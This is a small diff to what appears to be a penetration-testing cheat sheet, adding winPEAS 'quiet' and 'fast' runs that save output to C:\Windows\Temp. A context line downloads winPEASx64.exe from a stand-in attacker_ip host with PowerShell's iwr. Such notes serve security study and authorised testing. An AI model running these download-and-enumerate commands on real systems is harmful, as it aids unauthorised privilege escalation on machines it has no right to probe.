@@ -919,6 +919,8 @@ iwr -uri http://attacker_ip/enum/winPEASx64.exe -outfile winPEAS.exe
 
 # save output if possible
 .\winPEAS.exe | Tee-Object -FilePath C:\Windows\Temp\winpeas.txt
+.\winPEAS.exe quiet | Tee-Object -FilePath C:\Windows\Temp\winpeas.txt
+.\winPEAS.exe fast | Tee-Object -FilePath C:\Windows\Temp\winpeas.txt
 ```
 
 e.g interesting output
